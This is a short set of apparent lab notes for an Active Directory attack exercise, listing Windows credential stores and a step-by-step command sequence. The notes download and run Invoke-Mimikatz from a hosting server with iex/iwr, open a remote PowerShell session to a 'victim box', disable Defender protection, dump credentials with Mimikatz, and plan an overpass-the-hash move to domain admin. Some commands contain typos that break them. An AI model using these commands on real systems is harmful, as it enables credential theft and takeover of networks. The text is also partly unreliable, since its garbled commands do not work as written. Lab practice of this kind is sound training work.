LSA Secrets

SAM

Credential Vault

### Invoke mimikatz on hfs in shell admin cli

Host Invoke-Mimikatz.ps1 on server

```
iex (iwr http://172.16.100.49/Invoke-Mimikatz.ps1 -UseBasicParsing)

```
### Create session from Jenkins host to new victim box

```
$sess = New-PSSession - Computerne dcorp-mgmt.dollarcorp.moneycorp.local
```

### Disable amsi on new admin machine in session

```
Invoke-command - ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

```

### Invoke mimikatz in session

```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

Gather Creds

Move to OPTH create tgt and run process as da